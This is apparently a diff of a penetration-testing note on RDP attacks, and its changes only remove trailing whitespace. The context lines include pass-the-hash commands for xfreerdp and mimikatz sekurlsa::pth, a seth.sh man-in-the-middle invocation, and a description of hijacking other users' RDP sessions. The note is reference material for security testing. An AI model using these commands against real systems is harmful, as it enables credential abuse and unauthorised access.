@@ -191,7 +191,7 @@ feature.
 xfreerdp /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /pth:<HASH> /v:<HOSTNAME | IP>
 
 # Windows.
-# The Remote Desktop Connection (mstsc.exe) client will display the currently logged user information but the network connection will be established using the identity specified to mimikatz's sekurlsa::pth.  
+# The Remote Desktop Connection (mstsc.exe) client will display the currently logged user information but the network connection will be established using the identity specified to mimikatz's sekurlsa::pth.
 sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"mstsc.exe /restrictedadmin"
 ```
 
@@ -233,6 +233,6 @@ seth.sh <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP | HOST_IP> [<COMMAND>]
 If `Administrator` / `NT AUTHORITY\SYSTEM` privileges could be obtained on a
 host, `RDP` sessions of others users can be hijacked. This could be used to
 access the host as the hijacked user through a GUI interface with out knowing
-its password.  
+its password.
 
 To hijack `RDP` session refer to the `[Windows] Post Exploitation` note.
